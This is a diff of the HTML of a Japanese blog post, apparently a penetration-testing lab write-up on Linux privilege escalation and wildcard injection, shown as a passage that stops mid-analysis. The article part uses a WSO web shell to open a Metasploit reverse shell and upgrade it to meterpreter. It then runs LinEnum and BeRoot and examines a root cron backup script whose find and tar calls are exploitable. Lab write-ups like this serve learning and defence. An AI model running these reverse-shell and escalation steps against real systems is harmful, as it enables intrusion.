@@ -1,31 +1,15 @@
 <!DOCTYPE html>
-<html lang="en" itemscope itemtype="http://schema.org/WebPage">
-  <head>
-    
-
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-
-  <title>ペネトレ検証-権限昇格とWildcard Injectionの原理 - Shooting!!!</title>
-  <meta property="og:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
-  <meta name="twitter:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
-  <meta name="description" content="しゅーとです。
-引き続きペネトレーションテストの検証をしていきます。
-前回の記事はこちら。
-
-ペネトレ検証-ECサイトに侵入">
-  <meta property="og:description" content="しゅーとです。
-引き続きペネトレーションテストの検証をしていきます。
-前回の記事はこちら。
-
-ペネトレ検証-ECサイトに侵入">
-  <meta name="twitter:description" content="しゅーとです。
-引き続きペネトレーションテストの検証をしていきます。
-前回の記事はこちら。
-
-ペネトレ検証-ECサイトに侵入">
-  <meta name="author" content="しゅーと"/><script type="application/ld+json">
+<html lang="ja-JP"><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<meta name="generator" content="Hugo 0.68.3" />
+	
+	<link rel="icon" href="/img/favicon.ico">
+	
+	<title>ペネトレ検証-権限昇格とWildcard Injectionの原理 | Shooting!!!</title>
+	
+	
+	<script type="application/ld+json">
 {
     "@context": "http://schema.org",
     "@type": "WebSite",
@@ -70,15 +54,15 @@
   "@context": "http://schema.org",
   "@type": "Article",
   "author": {
-    "name" : "しゅーと"
+    "name" : ""
   },
   "headline": "ペネトレ検証-権限昇格とWildcard Injectionの原理",
   "description" : "しゅーとです。\n引き続きペネトレーションテストの検証をしていきます。\n前回の記事はこちら。\nペネトレ検証-ECサイトに侵入\n",
   "inLanguage" : "en",
-  "wordCount":  1410 ,
+  "wordCount":  7944 ,
   "datePublished" : "2019-05-13T03:15:21",
   "dateModified" : "2019-05-13T03:15:21",
-  "image" : "https:\/\/www.shutingrz.com\/",
+  "image" : "https:\/\/www.shutingrz.com\/img\/favicon.ico",
   "keywords" : [ "pentest, priv_escalation, ethical_hacking" ],
   "mainEntityOfPage" : "https:\/\/www.shutingrz.com\/post\/ad_hack-linux_priv_escalation\/",
   "publisher" : {
@@ -86,7 +70,7 @@
     "name" : "https:\/\/www.shutingrz.com\/",
     "logo" : {
         "@type" : "ImageObject",
-        "url" : "https:\/\/www.shutingrz.com\/",
+        "url" : "https:\/\/www.shutingrz.com\/img\/favicon.ico",
         "height" :  60 ,
         "width" :  60
     }
@@ -100,6 +84,7 @@
 前回の記事はこちら。
 
 ペネトレ検証-ECサイトに侵入">
+<meta property="og:image" content="https://www.shutingrz.com/img/favicon.ico" />
 <meta property="og:url" content="https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/" />
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="Shooting!!!" />
@@ -109,199 +94,155 @@
 前回の記事はこちら。
 
 ペネトレ検証-ECサイトに侵入">
-  <meta name="twitter:card" content="summary" />
-  <meta name="twitter:site" content="@shutingrz" />
-  <meta name="twitter:creator" content="@shutingrz" />
-  <link href='https://www.shutingrz.com/img/favicon.ico' rel='icon' type='image/x-icon'/>
-  <meta name="twitter:card" content="summary" />
-  <meta name="twitter:site" content="@shutingrz" />
-  <meta name="twitter:creator" content="@shutingrz" />
-  <meta property="og:url" content="https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/" />
-  <meta property="og:type" content="website" />
-  <meta property="og:site_name" content="Shooting!!!" />
-
-  <meta name="generator" content="Hugo 0.68.3" />
-  <link rel="alternate" href="https://www.shutingrz.com/index.xml" type="application/rss+xml" title="Shooting!!!"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://www.shutingrz.com/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://www.shutingrz.com/css/syntax.css" /><link rel="stylesheet" href="https://www.shutingrz.com/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
-
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-137567513-1', 'auto');
+  <meta name="twitter:image" content="https://www.shutingrz.com/img/favicon.ico" />
+  <meta name="twitter:card" content="summary" /> 
 	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
 
+	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp"
+	 crossorigin="anonymous">
+	<link href="https://fonts.googleapis.com/css?family=Righteous%7CMerriweather:300,300i,400,400i,700,700i" rel="stylesheet">
+	<link href="/css/medium.css" rel="stylesheet">
+	<link href="/css/additional.css" rel="stylesheet">
 
-  </head>
-  <body>
-    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
-  <div class="container-fluid">
-    <div class="navbar-header">
-      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
-        <span class="sr-only">Toggle navigation</span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-      </button>
-      <a class="navbar-brand" href="https://www.shutingrz.com/">Shooting!!!</a>
-    </div>
+	
+	
+	<link rel="stylesheet" href="/css/codeblock.css" integrity="" crossorigin="anonymous" media="screen">
+	<link rel="stylesheet" href="/css/code-default.css" integrity="" crossorigin="anonymous" media="screen">
+	<link rel="stylesheet" href="/css/table.css" integrity="" crossorigin="anonymous" media="screen">
+	<link rel="stylesheet" href="/css/custom-font.css" integrity="" crossorigin="anonymous" media="screen">
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-light bg-white fixed-top mediumnavigation nav-down">
+    <div class="container pr-0">
+        
+        <a class="navbar-brand" href="https://www.shutingrz.com//">
 
-    <div class="collapse navbar-collapse" id="main-navbar">
-      <ul class="nav navbar-nav navbar-right">
+            
+            <img src="/img/favicon.ico" alt="logo">
+            
+        </a>
         
-          
-            <li>
-              <a title="Blog" href="/">Blog</a>
-            </li>
-          
+
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarMediumish" aria-controls="navbarSupportedContent"
+            aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
         
-          
-            <li>
-              <a title="Blog Tags" href="/tags">Blog Tags</a>
-            </li>
-          
-        
-          
-            <li class="navlinks-container">
-              <a class="navlinks-parent">Special Contents</a>
-              <div class="navlinks-children">
+        <div class="collapse navbar-collapse" id="navbarMediumish">
+            
+            <ul class="navbar-nav ml-auto">
+                 
+                <li class="nav-item ">
+                    <a class="nav-link" href="/post">Blog</a>
+                </li>
+                 
+                <li class="nav-item ">
+                    <a class="nav-link" href="/pages/about">About</a>
+                </li>
+                 
+                <li class="nav-item ">
+                    <a class="nav-link" href="https://twitter.com/shutingrz">Twitter</a>
+                </li>
                 
-                  <a href="/pages/oreore-coin">自作仮想通貨入門</a>
-                
-              </div>
-            </li>
-          
+            </ul>
+        </div>
         
-          
-            <li>
-              <a title="About" href="/pages/about">About</a>
-            </li>
-          
-        
-
-        
-
-        
-      </ul>
     </div>
-
-    
-
-  </div>
 </nav>
 
 
+        <div class="site-content">   
+            <div class="container">
+<div class="mainheading">
+    <h1 class="sitetitle"><a href="/post">Shooting!!!</a></h1>
+    <p class="lead">
+         Big Brother is watching you
+    </p>
+</div><div class="main-content">
+        
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-md-2 pl-0"><div class="share sticky-top sticky-top-offset">
+    <p>Share</p>
+    <ul>
+        <li class="ml-1 mr-1">
+        <a target="_blank" href="https://twitter.com/intent/tweet?text=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86&url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=435');return false;">
+        <i class="fab fa-twitter"></i>
+        </a>
+        </li>
+        
+        <li class="ml-1 mr-1">
+        <a target="_blank" href="https://facebook.com/sharer.php?u=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+        <i class="fab fa-facebook-f"></i>
+        </a>
+        </li>
 
+        <li class="ml-1 mr-1">
+        <a target="_blank" href="https://www.xing.com/spi/shares/new?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f" onclick="window.open(this.href, 'xing-share', 'width=550,height=435');return false;">
+        <i class="fab fa-xing"></i>
+        </a>
+        </li>        
+    </ul>
 
     
-
-
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-<div class="pswp__bg"></div>
-
-<div class="pswp__scroll-wrap">
-    
-    <div class="pswp__container">
-      <div class="pswp__item"></div>
-      <div class="pswp__item"></div>
-      <div class="pswp__item"></div>
-    </div>
-    
-    <div class="pswp__ui pswp__ui--hidden">
-    <div class="pswp__top-bar">
-      
-      <div class="pswp__counter"></div>
-      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-      <button class="pswp__button pswp__button--share" title="Share"></button>
-      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-      
-      
-      <div class="pswp__preloader">
-        <div class="pswp__preloader__icn">
-          <div class="pswp__preloader__cut">
-            <div class="pswp__preloader__donut"></div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-      <div class="pswp__share-tooltip"></div>
-    </div>
-    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-    </button>
-    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-    </button>
-    <div class="pswp__caption">
-      <div class="pswp__caption__center"></div>
-    </div>
-    </div>
-    </div>
 </div>
+</div>
+                                
+                <div class="col-md-9 flex-first flex-md-unordered">
+                    <div class="mainheading">
+                        	
+                        
+                        
+                        
+                        <div class="row post-top-meta">
+                            <div class="col-xs-12 col-md-3 col-lg-2 text-center text-md-left mb-4 mb-md-0 md-nopad-right">
+                                <img class="author-thumb" src="/img/prof.png" alt="しゅーと (@shutingrz)">
+                            </div>
+                            <div class="col-xs-12 col-md-9 col-lg-10 text-center text-md-left md-nopad-left">
+                                <a target="_blank" class="link-dark">しゅーと (@shutingrz)</a><br>
+                                <span class="author-description">
+                                    Security researcher<br>
+                                    <i class="far fa-star"></i>
+                                    May 13, 2019
+                                    <i class="far fa-clock clock"></i>
+                                    16 min read
+                                </span>					
+                            </div>
+                        </div>			
+                        	
+                        
+                              
+                        
+                        <h1 class="posttitle">ペネトレ検証-権限昇格とWildcard Injectionの原理</h1> 
+                        
+                        <div class="after-post-tags">
+                            <ul class="tags">
+                            
+                            <li>
+                            <a href="/tags/pentest">pentest</a>
+                            </li>
+                            
+                            <li>
+                            <a href="/tags/priv_escalation">priv_escalation</a>
+                            </li>
+                            
+                            <li>
+                            <a href="/tags/ethical_hacking">ethical_hacking</a>
+                            </li>
+                            
+                            </ul>
+                        </div>
+                    </div>
 
+                    
+                    
 
-  
-  
-  
-
-
-
-
-
-
-  
-
-  <header class="header-section ">
-    
-    <div class="intro-header no-img">
-      <div class="container">
-        <div class="row">
-          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-            <div class="post-heading">
-              
-                <h1>ペネトレ検証-権限昇格とWildcard Injectionの原理</h1>
-              
-              
-              
-              
-                <span class="post-meta">
-  
-  
-  <i class="fas fa-calendar"></i>&nbsp;Posted on May 13, 2019
-  
-  
-  
-  
-    &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;しゅーと
-  
-  
-</span>
-
-
-              
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </header>
-
-
-    
-<div class="container" role="main">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-      <article role="main" class="blog-post">
-        <p>しゅーとです。</p>
+                    
+                    <div class="article-post">
+                        <p>しゅーとです。</p>
 <p>引き続きペネトレーションテストの検証をしていきます。<br>
 前回の記事はこちら。<br>
 <!-- raw HTML omitted -->
@@ -336,24 +277,15 @@ msf5 exploit(multi/handler) &gt; run
 
 [*] Started reverse TCP handler on 192.168.2.22:12345 
 
-</code></pre>
-<p>WSO の Network toolsで、リバースシェルを張りにいきます。</p>
-
-<link rel="stylesheet" href="/css/hugo-easy-gallery.css" />
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./wso_reverse.png" alt="./wso_reverse.png"/>
-    </div>
-    <a href="./wso_reverse.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+</code></pre><p>WSO の Network toolsで、リバースシェルを張りにいきます。</p>
+<figure>
+    <img src="./wso_reverse.png"/> 
+</figure>
 
 <!-- raw HTML omitted -->
 <pre><code>[*] Sending stage (38 bytes) to 192.168.2.24
 [*] Command shell session 1 opened (192.168.2.22:12345 -&gt; 192.168.2.24:47686) at 2019-05-12 03:35:59 +0900
-</code></pre>
-<p>きました。</p>
+</code></pre><p>きました。</p>
 <p>次はmeterpreterにスイッチします。スイッチには shell_to_meterpreter を使います。</p>
 <pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; show options
 
@@ -365,48 +297,26 @@ Module options (post/multi/manage/shell_to_meterpreter):
    LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
    LPORT    4433             yes       Port for payload to connect to.
    SESSION  1                yes       The session to run this module on.
-</code></pre>
-<!-- raw HTML omitted -->
+</code></pre><!-- raw HTML omitted -->
 <p>実行します。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./switch_meterpreter.png" alt="./switch_meterpreter.png"/>
-    </div>
-    <a href="./switch_meterpreter.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./switch_meterpreter.png"/> 
+</figure>
 
 <p>無事 meterpreter へスイッチできました。</p>
 <p>セッションを見てみます。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./switch_meterpreter_sessions.png" alt="./switch_meterpreter_sessions.png"/>
-    </div>
-    <a href="./switch_meterpreter_sessions.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./switch_meterpreter_sessions.png"/> 
+</figure>
 
 <!-- raw HTML omitted -->
 <!-- raw HTML omitted -->
 <h4 id="小ネタどのようにmeterpreterにスイッチされる">(小ネタ)どのようにmeterpreterにスイッチされる？</h4>
 <p>msfconsoleではshellからmeterpreterを起動させましたが、実際metasploitはどのようにやっているのでしょう。<br>
 実際にパケットをとってみると以下のようになっていました。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./switch_meterpreter_pcap.png" alt="./switch_meterpreter_pcap.png"/>
-    </div>
-    <a href="./switch_meterpreter_pcap.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./switch_meterpreter_pcap.png"/> 
+</figure>
 
 <p>ワンライナーでmeterpreterのstagerをvictimに実行させてるんですね。<br>
 stagerはLHOSTに記載のホストに接続し、meterpreter stageを読み込み、実行します。<br>
@@ -436,44 +346,42 @@ pwd
 chmod u+x LinEnum.sh
 
 ./LinEnum.sh | tee LinEnum_out.txt
-</code></pre>
-<p>結果は非常に長大なため省略します。</p>
+</code></pre><p>結果は非常に長大なため省略します。</p>
 <p>結果をみたところ即脆弱性につながる情報はありませんでしたが、以下のいい情報が得られました。</p>
-<pre><code class="language-bash">uid=105(sshd) gid=65534(nogroup) groups=65534(nogroup)
-uid=1000(ecadmin) gid=1000(ecadmin) groups=1000(ecadmin)
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">uid</span><span class="o">=</span>105<span class="o">(</span>sshd<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>65534<span class="o">(</span>nogroup<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>65534<span class="o">(</span>nogroup<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ecadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ecadmin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ecadmin<span class="o">)</span>
 
-(snip)
+<span class="o">(</span>snip<span class="o">)</span>
 
-[-] Are permissions on /home directories lax:
+<span class="o">[</span>-<span class="o">]</span> Are permissions on /home directories lax:
 total 12K
-drwxr-xr-x 1 root    root    4.0K May 11 18:58 .
-drwxr-xr-x 1 root    root    4.0K May 11 18:50 ..
-drwxr-xr-x 3 ecadmin ecadmin 4.0K May 11 19:40 ecadmin
+drwxr-xr-x <span class="m">1</span> root    root    4.0K May <span class="m">11</span> 18:58 .
+drwxr-xr-x <span class="m">1</span> root    root    4.0K May <span class="m">11</span> 18:50 ..
+drwxr-xr-x <span class="m">3</span> ecadmin ecadmin 4.0K May <span class="m">11</span> 19:40 ecadmin
 
-(snip)
+<span class="o">(</span>snip<span class="o">)</span>
 
 /etc/cron.daily:
 total 56
-drwxr-xr-x 1 root root  4096 May 11 19:37 .
-drwxr-xr-x 1 root root  4096 May 11 18:58 ..
--rw-r--r-- 1 root root   102 Mar 21 19:45 .placeholder
--rwxr-xr-x 1 root root   625 Mar 31  2018 apache2
--rwxr-xr-x 1 root root 15000 Dec 11  2016 apt
--rwxr-xr-x 1 root root   695 May 11 19:39 bakProductImage.sh
--rwxr-xr-x 1 root root  1597 May  2  2016 dpkg
--rwxr-xr-x 1 root root  4125 Feb 10  2018 exim4-base
--rwxr-xr-x 1 root root   249 May 17  2017 passwd
+drwxr-xr-x <span class="m">1</span> root root  <span class="m">4096</span> May <span class="m">11</span> 19:37 .
+drwxr-xr-x <span class="m">1</span> root root  <span class="m">4096</span> May <span class="m">11</span> 18:58 ..
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">102</span> Mar <span class="m">21</span> 19:45 .placeholder
+-rwxr-xr-x <span class="m">1</span> root root   <span class="m">625</span> Mar <span class="m">31</span>  <span class="m">2018</span> apache2
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">15000</span> Dec <span class="m">11</span>  <span class="m">2016</span> apt
+-rwxr-xr-x <span class="m">1</span> root root   <span class="m">695</span> May <span class="m">11</span> 19:39 bakProductImage.sh
+-rwxr-xr-x <span class="m">1</span> root root  <span class="m">1597</span> May  <span class="m">2</span>  <span class="m">2016</span> dpkg
+-rwxr-xr-x <span class="m">1</span> root root  <span class="m">4125</span> Feb <span class="m">10</span>  <span class="m">2018</span> exim4-base
+-rwxr-xr-x <span class="m">1</span> root root   <span class="m">249</span> May <span class="m">17</span>  <span class="m">2017</span> passwd
 
-(snip)
+<span class="o">(</span>snip<span class="o">)</span>
 
-### SERVICES #############################################
-[-] Running processes:
+<span class="c1">### SERVICES #############################################</span>
+<span class="o">[</span>-<span class="o">]</span> Running processes:
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-root      1305  0.0  0.0  55184  2824 ?        Ss   18:59   0:00 /usr/sbin/sshd
+root      <span class="m">1305</span>  0.0  0.0  <span class="m">55184</span>  <span class="m">2824</span> ?        Ss   18:59   0:00 /usr/sbin/sshd
 
 
-</code></pre>
-<p>この結果から、3つのことがわかります。</p>
+</code></pre></div><p>この結果から、3つのことがわかります。</p>
 <ul>
 <li>sshが2222/tcpで動いている</li>
 <li>ecadminというユーザが存在する</li>
@@ -498,73 +406,63 @@ tar xf beroot_linux.tar
 cd beroot_linux
 python beroot.py
 
-</code></pre>
-<p>実行した結果、プラットフォームに関する脆弱性はありませんでした。</p>
+</code></pre><p>実行した結果、プラットフォームに関する脆弱性はありませんでした。</p>
 <p>しかし、汎用的な脆弱性を見つけるルーチンで意外なものを見つけました。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./beroot_out.png" alt="./beroot_out.png"/>
-    </div>
-    <a href="./beroot_out.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./beroot_out.png"/> 
+</figure>
 
 <p>サーバ管理者が設置した「bakProductImage.sh」に脆弱性があるかもしれないという示唆です。</p>
 <!-- raw HTML omitted -->
 <h3 id="bakproductimagesh-の調査">bakProductImage.sh の調査</h3>
 <p>さて、LinEnumとBeRootで見つけたbakProductImage.shが何者かを調べます。</p>
-<pre><code class="language-bash">#!/bin/bash
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+
+bakDir<span class="o">(){</span>
+        <span class="nv">img_dir_path</span><span class="o">=</span><span class="nv">$1</span>
+        <span class="nv">dir_name</span><span class="o">=</span><span class="sb">`</span>basename <span class="nv">$img_dir_path</span><span class="sb">`</span>
+        tar -C <span class="sb">`</span>dirname <span class="nv">$img_dir_path</span><span class="sb">`</span> -cf <span class="nv">$work_dir</span>/<span class="nv">$dir_name</span>.tar <span class="nv">$dir_name</span>
+<span class="o">}</span>
 
 
-bakDir(){
-        img_dir_path=$1
-        dir_name=`basename $img_dir_path`
-        tar -C `dirname $img_dir_path` -cf $work_dir/$dir_name.tar $dir_name
-}
+<span class="nv">ecshop_dir</span><span class="o">=</span>/var/www/html
+<span class="nv">bak_dir</span><span class="o">=</span>/var/backups/ecshop
+<span class="nv">date</span><span class="o">=</span><span class="sb">`</span>date +<span class="s2">&#34;%Y%m%d&#34;</span><span class="sb">`</span>
 
+<span class="nv">TMP</span><span class="o">=</span><span class="sb">`</span>mktemp -d<span class="sb">`</span>
+<span class="nb">trap</span> <span class="s2">&#34;rm -rf </span><span class="nv">$TMP</span><span class="s2">&#34;</span> EXIT
+<span class="nv">work_dir</span><span class="o">=</span><span class="nv">$TMP</span>/<span class="nv">$date</span>
 
-ecshop_dir=/var/www/html
-bak_dir=/var/backups/ecshop
-date=`date +&quot;%Y%m%d&quot;`
+mkdir <span class="nv">$work_dir</span>
 
-TMP=`mktemp -d`
-trap &quot;rm -rf $TMP&quot; EXIT
-work_dir=$TMP/$date
+<span class="c1">#archive product image dir</span>
+<span class="nv">image_dirs</span><span class="o">=</span><span class="sb">`</span> find <span class="nv">$ecshop_dir</span>/images -maxdepth <span class="m">1</span> -name <span class="s2">&#34;*&#34;</span> -type d <span class="sb">`</span>
 
-mkdir $work_dir
+<span class="k">for</span> dir in <span class="nv">$image_dirs</span><span class="p">;</span> <span class="k">do</span>
+        <span class="nv">isProductDir</span><span class="o">=</span><span class="sb">`</span>find <span class="nv">$dir</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d  <span class="p">|</span>wc -l<span class="sb">`</span>
+        <span class="k">if</span> <span class="o">[</span> <span class="nv">$isProductDir</span> -eq <span class="m">1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+                bakDir <span class="nv">$dir</span>
+        <span class="k">fi</span>
+<span class="k">done</span>
 
-#archive product image dir
-image_dirs=` find $ecshop_dir/images -maxdepth 1 -name &quot;*&quot; -type d `
+<span class="c1">#backup</span>
+tar -C <span class="sb">`</span>dirname <span class="nv">$work_dir</span><span class="sb">`</span> -cf <span class="nv">$bak_dir</span>/<span class="nv">$date</span>.tar <span class="sb">`</span>basename <span class="nv">$work_dir</span><span class="sb">`</span>
+chown ecadmin <span class="nv">$bak_dir</span>/<span class="nv">$date</span>.tar
 
-for dir in $image_dirs; do
-        isProductDir=`find $dir -maxdepth 1 -name 'goods_img' -type d  |wc -l`
-        if [ $isProductDir -eq 1 ]; then
-                bakDir $dir
-        fi
-done
+rm -rf <span class="nv">$TMP</span>
 
-#backup
-tar -C `dirname $work_dir` -cf $bak_dir/$date.tar `basename $work_dir`
-chown ecadmin $bak_dir/$date.tar
-
-rm -rf $TMP
-
-</code></pre>
-<p>ECShopのサイトにある商品画像をバックアップするスクリプトのようです。<br>
+</code></pre></div><p>ECShopのサイトにある商品画像をバックアップするスクリプトのようです。<br>
 パッと見は普通のスクリプトですね。</p>
 <p>findコマンドで「/var/www/html/images/」直下のディレクトリを取得し、<br>
 そのディレクトリの直下に&quot;goods_img&quot;ディレクトリが存在するかを確認します。<br>
 goods_imgディレクトリが存在したらそのディレクトリはバックアップ対象になるようですね。</p>
 <p>保存先は /var/backups/ecshop で、%Y%m%d.tar の形式でアーカイブされるようです。</p>
-<pre><code class="language-shell">ls -la /var/backups/ecshop/|tail -n 3
--rw-r--r-- 1 ecadmin root 4700160 May  9 01:00 20190509.tar
--rw-r--r-- 1 ecadmin root 4700160 May 10 01:00 20190510.tar
--rw-r--r-- 1 ecadmin root 4700160 May 11 01:00 20190511.tar
-</code></pre>
-<p>日時を見るに、毎日1時にcronが走っているんですね。</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ls -la /var/backups/ecshop/<span class="p">|</span>tail -n 3
+-rw-r--r-- <span class="m">1</span> ecadmin root <span class="m">4700160</span> May  <span class="m">9</span> 01:00 20190509.tar
+-rw-r--r-- <span class="m">1</span> ecadmin root <span class="m">4700160</span> May <span class="m">10</span> 01:00 20190510.tar
+-rw-r--r-- <span class="m">1</span> ecadmin root <span class="m">4700160</span> May <span class="m">11</span> 01:00 20190511.tar
+</code></pre></div><p>日時を見るに、毎日1時にcronが走っているんですね。</p>
 <p>また、以下からcronはroot権限で行われていることが推測できます。</p>
 <ul>
 <li>スクリプト内の最後でchownで所有者をecadminに変更している</li>
@@ -583,25 +481,17 @@ goods_imgディレクトリが存在したらそのディレクトリはバッ�
 <h1 id="wildcard-injectionの原理と検証">Wildcard Injectionの原理と検証</h1>
 <p>BeRootは bakProductImage.shのfindコマンドに脆弱性の可能性ありと指摘しました。</p>
 <p>bakProductImage.sh のfind周りを見てみます。</p>
-<pre><code class="language-bash">image_dirs=` find $ecshop_dir/images -maxdepth 1 -name &quot;*&quot; -type d `
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">image_dirs</span><span class="o">=</span><span class="sb">`</span> find <span class="nv">$ecshop_dir</span>/images -maxdepth <span class="m">1</span> -name <span class="s2">&#34;*&#34;</span> -type d <span class="sb">`</span>
 
-for dir in $image_dirs; do
-        isProductDir=`find $dir -maxdepth 1 -name 'goods_img' -type d  |wc -l`
-        if [ $isProductDir -eq 1 ]; then
-                bakDir $dir
-        fi
-done
-</code></pre>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./bak_find.png" alt="./bak_find.png"/>
-    </div>
-    <a href="./bak_find.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<span class="k">for</span> dir in <span class="nv">$image_dirs</span><span class="p">;</span> <span class="k">do</span>
+        <span class="nv">isProductDir</span><span class="o">=</span><span class="sb">`</span>find <span class="nv">$dir</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d  <span class="p">|</span>wc -l<span class="sb">`</span>
